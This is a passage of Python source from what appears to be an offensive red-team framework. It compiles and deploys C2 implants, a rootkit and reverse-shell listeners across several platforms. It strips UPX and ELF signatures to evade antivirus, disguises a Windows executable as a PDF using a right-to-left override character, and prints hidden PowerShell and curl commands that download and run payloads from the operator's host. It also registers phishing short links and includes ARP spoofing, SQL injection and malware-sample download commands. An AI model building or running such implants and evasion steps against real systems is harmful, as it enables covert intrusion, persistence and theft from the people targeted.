        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent)
        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
        evil_content = evil_content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost).replace("{listener}", listener)
        payload_content = payload_content.replace("{line}", line).replace("{lhost}", lhost)
        rootkit_content = rootkit_content.replace("{line}", line)
        mrhyde_content = mrhyde_content.replace("{line}", line).replace("{lhost}", lhost)
        server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
        with open(f"{path}/sessions/key.aes", 'rb') as f:
            AES_KEY = f.read()

        with open(f"{path}/sessions/mrhyde.c", 'w+') as f:
            f.write(rootkit_content)
        with open(f"{path}/sessions/mrhydew.c", 'w+') as f:
            f.write(mrhyde_content)

        with open("sessions/payload.sh", 'w+') as f:
            f.write(payload_content)
        with open("sessions/wmr.c", 'w+') as f:
            f.write(cwcontent)

        with open("sessions/mr.c", 'w+') as f:
            f.write(content_mon)

        with open("sessions/r", 'w+') as f:
            f.write(content)

        with open("sessions/w", 'w+') as f:
            f.write(wcontent)

        with open("sessions/ratbat.bat", 'w+') as f:
            f.write(bcontent)


        with open(filek, 'r') as f:
            content = f.read()

        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
        with open("sessions/b.c", 'w+') as f:
            f.write(content)

        with open(files, 'r') as f:
            content = f.read()

        with open(f"sessions/listener_{line}.sh", 'w+') as f:
            f.write(evil_content)

        print_msg(f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &")

        content = content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", rhost)
        with open("sessions/server.c", 'w+') as f:
            f.write(content)
        with open(filer, 'r') as f:
            contentr = f.read()

        contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
        with open("sessions/r.sh", 'w+') as f:
            f.write(contentr)

        with open(gofile, 'r') as f:
            content = f.read()

        with open(gofile2, 'r') as f:
            lcontent = f.read()

        #with open(gofile3, 'r') as f:
        #    lateral_content = f.read()

        with open(gofile4, 'r') as f:
            monrevlin_content = f.read()

        AES_KEY_hex = AES_KEY.hex()

        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth).replace('{user_agent_1}', user_agent_1).replace('{user_agent_2}', user_agent_2).replace('{user_agent_3}', user_agent_3).replace('{url_trafic_1}', url_trafic_1).replace('{url_trafic_2}', url_trafic_2).replace('{url_trafic_3}', url_trafic_3)
        #content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)

        monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
        #lateral_content = lateral_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
        lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
        implant_go = "main.go"
        implant_go2 = implantgo + "_l.go"
        #implant_go_ws = implantgo_ws + ".go"
        if platform == "windows":
            implantgo += ".exe"
            implantgo2 += "_l.exe"
            #implantgo_ws += ".exe"
        beacon = f"sessions/{implant_go}"
        with open(beacon, 'w+') as f:
            f.write(content)

        #with open(implant_go_ws, 'w+') as f:
        #    f.write(content_ws)

        with open(f"{implant_go2}", 'w+') as f:
            f.write(lcontent)

        #with open(f"{server_go}", 'w+') as f:
        #    f.write(lateral_content)

        with open(f"{monrevlin}", 'w+') as f:
            f.write(monrevlin_content)
        cmd = "cd sessions ; rm go.mod ; go mod init main ; go mod tidy ; cp implant/loader_*.go . ; go get golang.org/x/sys/windows"
        self.cmd(cmd)
        if platform == "linux":
            loader = "loader_linux.go"
            binary = line
            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
            #compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
            compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
            compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
            command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
            cplib = 'cp /lib/x86_64-linux-gnu/libc.so.6 sessions/ && cp /lib64/ld-linux-x86-64.so.2 sessions/'
            self.cmd(command_rootkit)
            self.cmd(command_mon)
            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            self.cmd(compile_command4)
            #self.cmd(compile_command_ws)

            self.cmd(cplib)
            self.onecmd(f"service {line}")
            self.onecmd(f"service l_{line}")
            ofuscate = f"cd sessions && base64 payload.sh | (echo -n '#!/bin/bash\\necho \"' ; cat - ; echo '\" | base64 -d | bash') | sponge payload.sh"
            self.cmd(ofuscate)
            curl_payload = f"curl -o payload.sh http://{lhost}/payload.sh ; chmod +x payload.sh ; ./payload.sh "
            print_msg(curl_payload)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)
            upx = f"upx {self.sessions_dir}/monrev"
            self.cmd(upx)
            cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "'+line+'"'
            cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "'+line+'"'
            self.cmd(cmd_anti_upx)
            self.cmd(cmd_ant_elf)
            cmd_anti_upx = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})UPX!.{4}/$1$2\\0\\0\\0\\0\\0\\0\\0\\0/s\' "monrev"'
            cmd_ant_elf = 'cd sessions ; perl -i -0777 -pe \'s/^(.{64})(.{0,256})\\x7fELF/$1$2\\0\\0\\0\\0/s\' "monrev"'
            self.cmd(cmd_anti_upx)
            self.cmd(cmd_ant_elf)
            with open("sessions/implant/stub_lin.c", 'r') as f:
                stub = f.read()
                f.close()
            
            stub = stub.replace("{lhost}", lhost)
            with open("sessions/stub.c", 'w+') as f:
                f.write(stub)
                f.close()
            command_stub = f"gcc -o sessions/stub sessions/stub.c  -lcurl && upx sessions/stub"
            self.cmd(command_stub)

        elif platform == "windows":
            binary = f"{line}.exe"
            loader = "loader_windows.go"
            tool_to_check = "rsrc"
            if check_go_tool_installed(tool_to_check):
                print_msg(f"Tool '{tool_to_check}' is installed.")
            else:
                print_msg(f"Installing tool '{tool_to_check}'.")
                install = "go install github.com/akavel/rsrc@latest"
                self.cmd(install)
            icon_command = f"rsrc -ico static/pdf.ico -o sessions/icon.syso"
            self.cmd(icon_command)

            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w -H=windowsgui\" -o {implantgo} {implant_go} {loader}"
            #compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
            compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
            compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
            command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\"")
            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/b{line}.exe -OutFile b{line}.exe ; .\\b{line}.exe`\"\"")

            with open("sessions/implant/stub.c", 'r') as f:
                stub = f.read()
                f.close()
            
            stub = stub.replace("{lhost}", lhost)
            with open("sessions/stub.c", 'w+') as f:
                f.write(stub)
                f.close()
            command_stub = f"x86_64-w64-mingw32-gcc -o sessions/stub.exe sessions/stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 && upx sessions/stub.exe"
            self.cmd(command_stub)

            
            self.cmd(compile_cw)
            self.cmd(command_mrhyde)
            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            #self.cmd(compile_command_ws_win)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)
            upx = f"upx {self.sessions_dir}/b{binary}"
            self.cmd(upx)
            new_binary = f"{self.sessions_dir}/{binary}"
            newname = (new_binary.split('.')[0] + u'\u202e' + ".pdfx"[::-1]  + new_binary.split('.')[1]).encode('utf-8')
            
            print_msg("New Camuflage File " + str(newname))
            shutil.copy(file, newname)

        elif platform == "darwin":
            binary = line
            loader = "loader_linux.go"
            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=darwin CC=x86_64-apple-darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
            compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")

            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)

        elif platform == "android":
            binary = line
            loader = "loader_linux.go"
            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
            compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")

            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)

        elif platform == "ios":
            binary = line
            loader = "loader_linux.go"
            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1  CC=x86_64-apple-darwin GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
            compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")

            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)

        elif platform == "webassembly":
            binary = line
            loader = "loader_linux.go"
            compile_command = f"cd {self.sessions_dir} && CGO_ENABLED=1 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go} {loader}"
            compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
            #compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
            print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
            print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")

            self.cmd(compile_command)
            self.cmd(compile_command2)
            #self.cmd(compile_command3)
            upx = f"upx {self.sessions_dir}/{binary}"
            self.cmd(upx)

        encbeacon = f"""
        python3 -c "
        import base64
        with open('sessions/{binary}', 'rb') as f:
            data = f.read()
            xor_data = bytes([b ^ 0x33 for b in data])
            b64_data = base64.b64encode(xor_data)
        with open('sessions/beacon.enc', 'wb') as f:
            f.write(b64_data)
        "
        """.replace("        ","")
        self.display_toastr(f"Executing... {encbeacon}", type="info")
        os.system(encbeacon)
        print_msg(f"Go agent {implantgo} compiled successfully.")


        md5 = f"md5sum {self.sessions_dir}/{binary}"
        md5sum = self.cmd(md5)

        now = datetime.now()
        now_str = now.strftime("%Y-%m-%d %H:%M:%S")
        json_content = {
            "id": random_string,
            "name": line,
            "binary": f"{path}/sessions/{binary}",
            "url_binary": f"http://{lhost}/{binary}",
            "os_id": choice,
            "os": platform,
            "rhost": rhost,
            "log": f"{line}.log",
            "user_agent": user_agent,
            "maleable_route": maleable,
            "url": self.c2_url,
            "sleep": sleep,
            "username": USER,
            "password": PASS,
            "working_path": working_dir,
            "payload": payload,
            "created": now_str
        }
        with open(f"{implant_config_json}", 'w+') as f:
            json.dump(json_content, f, indent=4)

        json_file = self.sessions_dir + "/phishing/campaigns/short_urls.json"

        if not os.path.exists(json_file):
            short_urls = {}
        else:
            with open(json_file, 'r') as f:
                short_urls = json.load(f)

        if line in short_urls:
            print_warn(f"Entry '{line}' already exists in short urls")


        new_entry = {
            line: {
                "original_url": f"https://{lhost}/s/{binary}",
                "active": True,
                "created_at": datetime.now().isoformat()
            }
        }

        short_urls.update(new_entry)
        with open(json_file, 'w') as f:
            json.dump(short_urls, f, indent=2)

        print_msg(f"Created new entry for '{line}' in shorts urls")

        self.onecmd("create_session_json")
        if is_port_in_use(int(lport)):
            command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
            self.cmd(command)
            print_msg(f"Agent {line}/{platform} Crafted.")
        else:
            choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
            if choice == 'yes':
                command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
                self.cmd(command)
                print_msg("Username: LazyOwn")
                print_msg("Password: LazyOwn")
                self.cmd(server)

                print_warn(f"Shutdown Server C&C at port:{RED} {lport}")

        return

    @cmd2.with_category(miscellaneous_category)
    def do_kick(self, line):
        """
        Handles the process of sending a spoofed ARP packet to a specified IP address with a given MAC address.

        This function performs the following steps:
        1. Executes a command to list current ARP entries and prints the IP and MAC addresses.
        2. Prompts the user to input the target IP and MAC address in a specified format.
        3. Parses the provided input to extract the IP and MAC addresses.
        4. Sets up default values for the gateway IP, local MAC address, and network interface.
        5. Creates an ARP packet with the specified target IP and MAC address.
        6. Sends the ARP packet using the specified network interface.
        7. Prints a confirmation message indicating that the spoofing packet has been sent.

        Args:
            line (str): Input line for the command, which is not used directly in this function.

        Raises:
            Exception: If any error occurs during the execution of the function.
        """
        try:
            check_sudo()
            command="""sudo arp -a | awk '{print "IP: " $2 " MAC: " $4}'"""
            print_msg(command)
            self.cmd(command)
            choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
            target_ip, target_mac = parse_ip_mac(choice)
            if target_ip and target_mac:
                print(f"IP: {target_ip}, MAC: {target_mac}")
            gateway_ip = "192.168.1.1"
            my_mac = "00:11:22:33:44:55"
            print_msg("Available Interfaces: ")
            command = "ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'"
            self.cmd(command)
            choice = input("    [!] Enter the interface to use (Default: wlp2s0): ")
            if not choice:
                iface = "wlp2s0"
            else:
                iface = choice

            packet = create_arp_packet(my_mac, gateway_ip, target_ip, target_mac)
            send_packet(packet, iface)
            print(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")

        except Exception as e:
            print(f"Error: {e}")

    @cmd2.with_category(exploitation_category)
    def do_sqli(def_func, line):
        """
        Asks the user for the URL, database, table, and columns, and then executes the Python script
        'modules/lazybsqli.py' with the provided parameters.

        Parameters:
        - def_func: Function to execute (not used in this example).
        - line: Command line or additional input (not used in this example).

        Example:
        - do_bsqli(None, None)
        """

        # Solicitar parámetros al usuario
        url = input("Enter the URL (e.g., http://example.com/page.php): ")
        db = input("Enter the name of the database: ")
        table = input("Enter the name of the table: ")
        col = input("Enter the column names separated by commas (e.g., username,password): ")

        # Preparar el comando para ejecutar el script con los parámetros proporcionados
        command = [
            'python3', 'modules/lazysqli.py',
            '--url', url,
            '--db', db,
            '--table', table,
            '--col', col
        ]

        # Ejecutar el comando
        try:
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Script Error : {e}")
        except Exception as e:
            print_error(f"Unexpected Error: {e}")

    @cmd2.with_category(credential_access_category)
    def do_sshkey(self, line)            :
        """
        Generates an SSH key pair with RSA 4096-bit encryption. If no name is provided, it uses 'lazyown' by default.
        The keys are stored in the 'sessions/' directory.

        Parameters:
        - line: The name of the key file. If empty, 'lazyown' is used as the default.

        Example:
        - do_sshkey(None)  # Generates 'lazyown' key
        - do_sshkey("custom_key")  # Generates 'custom_key' key
        """
        if not line:
            print_warn("usign lazyown by default")
            line = "lazyown"

        command = f"ssh-keygen -t rsa -b 4096 -f sessions/{line}"
        print_msg(f"Try... {command}")
        self.cmd(command)

    @cmd2.with_category(credential_access_category)
    def do_crunch(self, line):
        """
        Generate a custom dictionary using the `crunch` tool.

        This function creates a wordlist with a specified length using the `crunch` command.
        It allows the user to specify a custom character pattern for the wordlist.

        :param line: The length of the strings to be generated (e.g., '6' for 6-character strings).
                    If not provided, the function will prompt an error message.

        :returns: None

        Example usage:
        >>> crunch 6
        This will generate a wordlist with all possible combinations of 6-character strings using the default pattern.

        Additional notes:
        - If no custom pattern is provided, the function uses a default pattern: "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
        - The output is saved in the `sessions/` directory with the filename format `dict_<length>.txt`
        """
        if not is_binary_present("crunch"):
            print_warn("Installing crunch...")
            self.cmd("sudo apt install crunch -y")

        if not line:
            print_error(f"You need to pass the length as an argument. Example: {GREEN}crunch 6{RESET}")
            return

        default_pattern = "0123456789abcdefghijklmnñopqrstuvxyz,.-#$%@"
        print_msg(f"Default pattern: {default_pattern}")

        choice_patt = input(f"    [?] Press Enter to use the default pattern, or enter a custom pattern: ")

        pattern = choice_patt if choice_patt else default_pattern
        print_msg(f"Using pattern: {pattern}")

        command = f"crunch {line} {line} {pattern} -o sessions/dict_{line}.txt"
        self.cmd(command)

        return

    @cmd2.with_category(reporting_category)
    def do_malwarebazar(self, line):
        """
        Fetches and displays malware information from the MalwareBazaar API based on the given tag.

        Args:
            line (str): The tag used to query the MalwareBazaar API.

        This function performs the following steps:
        1. Constructs a URL to query the MalwareBazaar API with the provided tag.
        2. Uses `curl` to send a POST request to the API and saves the response in a JSON file.
        3. Checks if the file was successfully created and exists.
        4. Loads the JSON data from the file.
        5. Checks the `query_status` field to determine if there are results.
            - If `no_results`, prints a warning message and exits the function.
        6. Iterates through the list of file information provided in the response.
            - Prints detailed information about each file, including:
                - File name
                - File type
                - File size
                - Hashes (SHA-256, SHA-1, MD5)
                - First seen date
                - Signature
                - Tags
                - ClamAV results (if any)
                - Downloads and uploads count
        7. Deletes the temporary file used to store the API response.

        Returns:
            None
        """
        file = f"sessions/{line}.json"
        command = f'curl -o {file} -X POST -d "query=get_taginfo&tag={line}&limit=50" https://mb-api.abuse.ch/api/v1/'
        run(command)

        if not is_exist(file):
            return

        with open(file, 'r') as f:
            data = json.load(f)

        if data.get("query_status") == "no_results":
            print_warn("Warning: No results found.")
            return

        for file_info in data['data']:
            print_msg(f"{BG_RED}{YELLOW}===== {MAGENTA}File Info {YELLOW}=====")
            print_msg(f"File Name: {BLUE}{file_info.get('file_name')}")
            print_msg(f"File Type: {BLUE}{file_info.get('file_type')}")
            print_msg(f"File Size: {BLUE}{file_info.get('file_size')} bytes")
            print_msg(f"{BG_YELLOW}{RED}SHA-256: {BLUE}{file_info.get('sha256_hash')}")
            print_msg(f"SHA-1: {BLUE}{file_info.get('sha1_hash')}")
            print_msg(f"MD5: {BLUE}{file_info.get('md5_hash')}")
            print_msg(f"First Seen: {BLUE}{file_info.get('first_seen')}")
            print_msg(f"Signature: {BLUE}{file_info.get('signature')}")
            print_msg(f"Tags: {BLUE}{', '.join(file_info.get('tags', []))}")

            intelligence = file_info.get('intelligence', {})
            clamav_results = intelligence.get('clamav', [])
            if clamav_results:
                print_msg(f"ClamAV Results: {', '.join(clamav_results)}")
            print_msg(f"Downloads: {BLUE}{intelligence.get('downloads')}")
            print_msg(f"Uploads: {BLUE}{intelligence.get('uploads')}")
            print_msg(f"{BG_YELLOW}{RED}====================={RESET}\n")

        run(f"rm {file}")

    @cmd2.with_category(reporting_category)
    def do_download_malwarebazar(self, line):
        """Download a malware sample from MalwareBazaar using its SHA256 hash.

        This function allows the user to download a malware sample from MalwareBazaar by providing
        the SHA256 hash of the desired file. If the hash is not provided as an argument, the function
        will prompt an error message indicating the correct usage. The downloaded malware sample
        will be saved as a zipped file (`malware.zip`) and will be password protected.

        Arguments:
        line (str): The SHA256 hash of the malware sample to be downloaded.

        Returns:
        None

        Example:
        >>> download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d

        Notes:
        - Ensure that the SHA256 hash provided is correct and that it corresponds to a file available
        on MalwareBazaar.
        - The downloaded file will be password protected using the password "infected".
        - To obtain the SHA256 hash of malware samples, refer to the `help malwarebazar` command.

        See Also:
        - `run(command)`: Utility function used to execute the command for downloading the malware.
        """
        if not line:
            print_error(f"You need pass the hash of malware as an argument example {GREEN}download_malwarebazar 094fd325049b8a9cf6d3e5ef2a6d4cc6a567d7d49c35f8bb8dd9e3c6acf3d78d {BLUE} To get hash of malware see {GREEN}help malwarebazar")
            return
        file = "sessions/malware.zip"
        command = f'curl -X POST -d "query=get_file&sha256_hash={line}" -o {file} https://mb-api.abuse.ch/api/v1/'
        run(command)
        print_msg(f'Please note that any malware sample you download from MalwareBazaar will be zipped (malware.zip) and password protected using the password "infected" (without "").')
        out = run(f"file {file}")
        print_msg(out)
        return

    @cmd2.with_category(recon_category)
    def do_sslscan(self, line):
        """
        Run an SSL scan on the specified remote host.

        This function initiates an SSL scan on a specified remote host (`rhost`)
        using the `sslscan-singleip.sh` script. If a specific port is provided in the
        `line` argument, the scan will target that port; otherwise, it will scan
        all available ports.

        Parameters:
        line (str): The port number to scan (optional). If omitted, the scan will target all ports.

        Internal Variables:
        rhost (str): The remote host IP address or hostname extracted from the `params` attribute.

        Returns:
        None

        Example Usage:
        - To scan all ports on the specified `rhost`: `sslscan`
        - To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`

        Note:
        - The `check_rhost()` function is used to validate the `rhost` before running the scan.
        - The `sslscan-singleip.sh` script must be present in the `sessions` directory.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        if not line:
            port = ""
        else:
            port = ":"+line

        command = f"cd sessions && ./sslscan-singleip.sh {rhost}{port}"
        print_msg(f"Attempting to execute: {command}")
        self.cmd(command)
        return

    @cmd2.with_category(credential_access_category)
    def do_cewl(self, line):
        """
        This function constructs and executes a command for the 'cewl' tool.
        It first checks if the 'url' parameter is set. If not, it prints an error message.
        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
        Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.

        Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):

        Parameters:
        line (str): The command line input for this function.

        Expected self.params keys:
        - url (str): The URL to be used for the 'cewl' command.

        Example usage:
        - assign url http://example.com
        - do_cewl
        """
        extra = ""
        url = self.params["url"]
        if not url:
            print_error(f"Url must be assign use{GREEN} assign url http://example.com")
            return
        domain = get_domain(url)
        if not os.path.exists('sessions/credentials.txt'):
            command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
            print_msg(command)
            self.cmd(command)

        else:

            if line:
                credentials = get_credentials(ncred=int(line))
            else:
                credentials = get_credentials()
            if not credentials:
                return

            for uname, passwd in credentials:
                password = passwd
                username = uname

            choice = input("    [!] Credentials found use Digest or basic (1 or 2) :")
            if choice == "1":
                auth_type = "Digest"
            else:
                auth_type = "basic"
            extra = f"--auth_type {auth_type} --auth_user {username} --auth_pass {password} "

            command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
            print_msg(command)
            self.cmd(command)
            return

    @cmd2.with_category(scanning_category)
    def do_dmitry(self, line):
        """
        This function constructs and executes a command for the 'dmitry' tool.
        It first checks if the 'url' parameter is set. If not, it prints an error message.
        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
        Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.

        Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:

        Parameters:
        line (str): The command line input for this function.

        Expected self.params keys:
        - url (str): The URL to be used for the 'dmitry' command.

        Example usage:
        - assign url http://example.com
        - do_dmitry
        """
        if not is_binary_present("dmitry"):
            print_warn("Installing dmitry...")
            self.cmd("sudo apt install dmitry -y")

        url = self.params["url"]
        if not url:
            print_error(f"Url must be assign use{GREEN} assign url http://example.com")
            return
        domain = get_domain(url)

        command = f"dmitry -winseo sessions/dmitry_{domain}.txt {domain}"
        print_msg(command)
        self.cmd(command)
        return

    @cmd2.with_category(recon_category)
    def do_graudit(self, line):
        """
        Executes the graudit command to perform a static code analysis with the specified options.

        This function runs the 'graudit' tool with the '-A' option for an advanced scan and
        the '-i sessions' option to include session files. The results will be displayed
        directly in the terminal.

        Args:
            line (str): Input line from the command interface. This argument is currently
                        not used within the function but is required for the command
                        interface structure.

        Example:
            To run this function from the command interface, simply type 'graudit' and press enter.
            The function will execute the 'graudit -A -i sessions' command.

        Note:
            Ensure that 'graudit' is installed and properly configured in your system's PATH
            for this function to work correctly.
        """

        if not is_binary_present("graudit"):
            print_warn("Installing graudit...")
            self.cmd("sudo apt install graudit -y")

        command = "graudit -A -i sessions"
        self.cmd(command)
        return

    @cmd2.with_category(command_and_control_category)
    def do_msfrpc(self, line):
        """
        Connects to the msfrpcd daemon and allows remote control of Metasploit.

        Usage:
            msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]

        This command will prompt the user for necessary information to connect to msfrpcd.
        """
        ip_address = input("    [!] Enter the IP address to connect to (default: 127.0.0.1): ") or "127.0.0.1"
        port = input("    [!] Enter the port to connect to (default: 55553): ") or "55553"
        username = input("    [!] Enter the username: ")
        password = input("    [!] Enter the password: ")
        use_ssl = input("    [!] Disable SSL? (yes/no, default: no): ").strip().lower() == "yes"

        cmd = ["msfrpc", "-a", ip_address, "-p", port, "-U", username, "-P", password]
        if use_ssl:
            cmd.append("-S")
        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            print_error(f"Error connecting to msfrpcd: {e}")

    @cmd2.with_category(scanning_category)
    def do_nuclei(self, line):
        """
